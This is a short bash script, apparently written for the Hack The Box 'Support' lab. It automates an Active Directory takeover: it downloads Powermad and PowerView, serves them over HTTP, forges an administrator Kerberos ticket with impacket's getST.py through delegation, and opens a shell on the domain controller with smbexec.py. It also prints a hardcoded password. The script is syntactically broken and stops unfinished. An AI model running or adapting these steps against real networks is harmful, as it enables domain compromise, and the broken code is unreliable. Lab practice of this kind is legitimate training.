echo "Starting Now ......"
sleep 2 
if [ $EUID != 0 ] 
then
    echo "\033[0;31mYou are not root.\033[0m"
    exit
fi
else
    wget "https://raw.githubusercontent.com/Kevin-Robertson/Powermad/master/Powermad.ps1" 
    wget "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1"

    echo "Please Open New Terminal And Make A Http Server: \033[0;32m`sudo python3 -m http.server 8000`\033[0m"
    echo "Add dc.support.htb subdomain in your /etc/hosts"
    while 
    do
        read -t 1 -n 1 key
        if [[ $key = "finished" ]]
        then
            echo "Password Is: bl1ckhere"
            /usr/share/doc/python3-impacket/examples/getST.py support.htb/fake01 -dc-ip dc.support.htb -impersonate administrator -spn www/dc.support.htb
            export KRB5CCNAME=administrator.ccache
            /usr/share/doc/python3-impacket/examples/smbexec.py support.htb/administrator@dc.support.htb -no-pass -k


    





